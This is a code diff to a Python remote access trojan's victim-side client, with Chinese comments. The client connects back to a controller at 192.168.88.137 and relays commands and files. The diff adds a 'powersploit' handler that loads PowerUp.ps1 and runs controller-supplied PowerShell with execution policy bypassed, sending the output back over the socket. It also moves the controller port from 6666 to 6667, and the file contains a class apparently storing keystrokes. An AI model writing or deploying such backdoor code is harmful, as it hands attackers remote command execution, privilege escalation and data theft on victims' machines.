@@ -20,9 +20,14 @@ class Victim:
             command = self.victimSocket.recv(1024).decode("gbk")
             if not command:
                 break
+            # 拆分命令
             commlist = command.split()
             if command == 'exit':
                 break
+            # 执行powersploit的命令
+            elif commlist[0] == "powersploit":
+                self.run_powershell_commands(commlist[1], self.victimSocket)
+                continue
             # 文件上传/下载
             elif command.split()[0] == 'upload' or command.split()[0] == 'download':
                 self.TransferFiles(self.victimSocket, command)
@@ -158,6 +163,35 @@ class Victim:
         end = time.time()
         return (end - beg)
 
+    # 执行powersploit命令
+    def run_powershell_commands(self, command, victimSocket):
+        commands = [
+            "Import-Module .\\PowerUp.ps1",
+            command
+        ]
+        try:
+            process = subprocess.Popen(
+                ["powershell", "-ExecutionPolicy", "Bypass", "-NoExit", "-Command", "-"],
+                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True
+            )
+            for cmd in commands:
+                process.stdin.write(cmd + '\n')
+                process.stdin.flush()
+
+            stdout, stderr = process.communicate()
+
+            if stderr:
+                self.send_result(victimSocket, f"Error: {stderr.strip()}".encode("gbk"))
+                # Check if the stdout is empty
+            if stdout.strip():
+                self.send_result(victimSocket, stdout.strip().encode("gbk"))
+            else:
+                self.send_result(victimSocket, "[-] Command executed but returned no output.".encode("gbk"))
+
+        except Exception as e:
+            self.send_result(victimSocket, f"Error executing commands: {e}".encode("gbk"))
+            self.send_result(victimSocket, "Failed to execute commands.".encode("gbk"))
+
     # 信息发送函数
     def send_result(self, victimSocket, result):
         # 打包固定长度
@@ -196,4 +230,4 @@ class stored_keyboard:
 
 
 if __name__ == '__main__':
-    victim = Victim("192.168.88.137", 6666)
+    victim = Victim("192.168.88.137", 6667)
